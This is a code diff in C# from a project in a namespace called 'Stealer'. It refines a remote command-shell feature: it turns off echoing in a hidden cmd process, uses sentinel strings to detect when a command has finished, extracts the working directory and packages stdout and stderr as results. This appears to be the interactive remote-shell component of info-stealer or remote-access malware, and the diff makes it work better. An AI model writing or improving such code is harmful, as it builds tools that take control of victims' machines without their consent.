@@ -202,7 +202,8 @@ namespace Stealer
             _cmdShell.BeginOutputReadLine();
             _cmdShell.BeginErrorReadLine();
 
-            // Drain initial banner
+            // Turn off command echoing, then drain banner
+            _cmdShell.StandardInput.WriteLine("@echo off");
             _cmdOut.Clear(); _cmdErr.Clear(); _cmdReady.Reset();
             _cmdShell.StandardInput.WriteLine("echo " + SHELL_DONE);
             _cmdShell.StandardInput.Flush();
@@ -228,20 +229,20 @@ namespace Stealer
 
                         bool ok = _cmdReady.Wait(15000);
 
-                        // Extract CWD from output before clearing
+                        // Extract CWD, strip sentinel line from displayed output
                         string rawOut = _cmdOut.ToString();
                         string cwd = "";
+                        var lines = new System.Collections.Generic.List<string>();
                         foreach (string ln in rawOut.Split('\n'))
                         {
-                            string t = ln.Trim();
+                            string t = ln.TrimEnd('\r');
                             if (t.StartsWith(SHELL_CWD))
-                            {
                                 cwd = t.Substring(SHELL_CWD.Length).Trim();
-                                rawOut = rawOut.Replace(ln, "").Replace(ln.TrimEnd(), "");
-                            }
+                            else
+                                lines.Add(t);
                         }
 
-                        string stdout = rawOut.TrimEnd();
+                        string stdout = string.Join("\n", lines).TrimEnd();
                         string stderr = _cmdErr.ToString().TrimEnd();
                         string result = string.IsNullOrEmpty(stderr) ? stdout
                             : (string.IsNullOrEmpty(stdout) ? "[STDERR]\r\n" + stderr
